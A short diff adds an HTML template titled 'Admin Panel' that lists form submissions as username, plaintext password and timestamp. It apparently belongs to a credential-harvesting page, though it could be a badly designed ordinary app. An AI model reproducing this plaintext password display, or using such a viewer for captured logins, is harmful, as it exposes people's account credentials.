@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Panel</title>
+</head>
+<body>
+    <h2>Submissions</h2>
+    <table border="1">
+        <tr>
+            <th>Username</th>
+            <th>Password</th>
+            <th>Timestamp</th>
+        </tr>
+        {% for sub in submissions %}
+        <tr>
+            <td>{{ sub.username }}</td>
+            <td>{{ sub.password }}</td>
+            <td>{{ sub.timestamp }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
